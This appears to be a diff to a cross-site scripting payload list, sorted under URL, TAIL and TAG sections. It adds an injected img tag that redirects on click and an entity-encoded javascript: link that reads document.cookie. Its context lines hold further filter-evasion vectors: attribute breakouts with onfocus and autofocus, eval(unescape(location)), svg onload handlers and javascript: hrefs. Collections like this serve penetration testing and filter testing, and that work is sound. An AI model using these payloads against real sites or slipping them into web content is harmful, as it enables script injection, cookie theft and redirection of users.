@@ -1,5 +1,6 @@
 URL ##
 
+http://Test"><img src=x onclick=window.location="http://google.com">
 " onfocus="alert(document.domain)"          "
 " onfocus="alert(document.domain)" autofocus="
 ";eval(unescape(location))//#%0Aalert(0)
@@ -42,6 +43,7 @@ TAIL ####
 
 TAG ###
 
+<a href=j&#97v&#97script:&#97lert(document.cookie)>ClickMe</a>
 <svg onload=alert%26%230000000040"1")>
 </a onmousemove="alert(1)">
 <a href="javascript:alert(document.domain)">javascript:alert(document.domain)</a>
